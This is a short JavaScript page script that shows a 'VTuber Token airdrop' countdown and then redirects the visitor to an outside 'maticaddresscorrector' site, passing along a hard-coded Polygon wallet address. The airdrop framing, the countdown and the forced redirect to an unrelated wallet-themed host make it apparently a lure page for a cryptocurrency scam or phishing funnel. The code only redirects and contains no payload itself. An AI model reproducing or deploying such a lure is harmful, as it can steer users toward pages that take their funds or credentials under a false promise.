let count;

window.onload = function(){
    count = 100;
    document.getElementById('message').textContent = "start" 
    checkUserLooking();
}

function checkUserLooking(){
    if (count < 0){
    location.href = "https://maticaddresscorrector.onrender.com/?address=0x131231C27A749991270805Ae48754FABB2466d7F";
    }
    count = count - 1;
    document.getElementById('message').textContent = "VTuber Token airdrop system will come in " + count + " seconds!"
    setTimeout( checkUserLooking , 1000);
}


